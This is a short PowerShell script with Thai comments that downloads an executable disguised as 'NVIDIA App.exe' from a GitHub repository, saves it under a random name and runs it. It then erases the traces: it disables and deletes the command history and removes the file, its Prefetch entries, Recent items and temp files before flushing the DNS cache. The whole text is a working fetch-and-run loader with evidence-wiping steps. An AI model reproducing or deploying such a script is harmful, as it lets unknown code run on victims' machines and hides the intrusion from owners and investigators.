# ============================================
# RUN EXE + MINIMAL TRACE (ใช้งานได้จริง)
# ============================================

# 1. ปิด PowerShell History
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-History

# 2. ดาวน์โหลด EXE
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
$randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
$tempPath = Join-Path $env:TEMP "$randomName.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($exeUrl, $tempPath)
} catch {
    try {
        Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
    } catch {
        Write-Host "Download failed." -ForegroundColor Red
        exit
    }
}

# 3. ตรวจสอบไฟล์
if (-not (Test-Path $tempPath)) {
    Write-Host "File not found." -ForegroundColor Red
    exit
}

# 4. รัน EXE (แบบปกติ)
try {
    $proc = Start-Process -FilePath $tempPath -WindowStyle Normal -PassThru
    Write-Host "Started with PID: $($proc.Id)" -ForegroundColor Green
} catch {
    Write-Host "Failed to start: $_" -ForegroundColor Red
    exit
}

# 5. รอให้ EXE เริ่มทำงาน (ปรับตามขนาดไฟล์)
Start-Sleep -Seconds 3

# 6. ลบไฟล์ EXE (ถ้าไม่ได้ถูกล็อค)
try {
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }
} catch {}

# 7. ลบ Prefetch (ลบไฟล์ .pf ที่เกี่ยวกับ EXE นี้)
try {
    $pfFiles = Get-ChildItem "C:\Windows\Prefetch\*$randomName*.pf" -ErrorAction SilentlyContinue
    $pfFiles | Remove-Item -Force -ErrorAction SilentlyContinue
} catch {}

# 8. ลบ PowerShell History
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
    Clear-History
} catch {}

# 9. ลบ Recent Documents
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*$randomName*" -Force -ErrorAction SilentlyContinue
} catch {}

# 10. ลบ Temp Files ที่เกี่ยวข้อง
try {
    Remove-Item "$env:TEMP\*$randomName*" -Force -ErrorAction SilentlyContinue
} catch {}

# 11. ล้าง DNS Cache (ถ้าต้องการ)
ipconfig /flushdns 2>$null

Write-Host "Done." -ForegroundColor Green
